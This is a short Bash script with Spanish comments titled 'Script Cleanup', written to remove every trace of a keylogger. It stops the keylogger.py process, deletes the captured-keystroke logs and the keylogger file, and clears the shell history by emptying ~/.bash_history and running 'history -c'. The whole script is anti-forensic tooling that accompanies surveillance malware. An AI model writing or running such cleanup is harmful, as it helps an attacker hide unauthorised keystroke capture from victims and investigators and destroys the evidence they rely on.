#!/bin/bash
# --------------------------------------------------------------
# Script Cleanup - Elimina todo rastro del keylogger
# Uso: bash cleanup.sh
# --------------------------------------------------------------

echo "[+] Iniciando limpieza de rastros del keylogger..."

echo "[+] Buscando proceso keylogger.py..."
pkill -f keylogger.py
if [ $? -eq 0 ]; then
    echo "[+] Proceso keylogger.py detenido."
else
    echo "[-] No se encontró el proceso keylogger.py ejecutándose."
fi

echo "[+] Eliminando archivos de registro (output.txt)..."
rm -f output.txt
rm -f ~/output.txt
rm -f keylog.txt

echo "[+] Eliminando el archivo keylogger.py..."
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
rm -f "$SCRIPT_DIR/keylogger.py"

if [ $? -eq 0 ]; then
    echo "[+] Archivo keylogger.py eliminado."
else
    echo "[-] No se encontró keylogger.py."
fi


echo "[+] Limpiando historial de comandos (bash history)..."

cat /dev/null > ~/.bash_history
history -c 

echo "[+] Limpieza completada. El sistema está limpio."
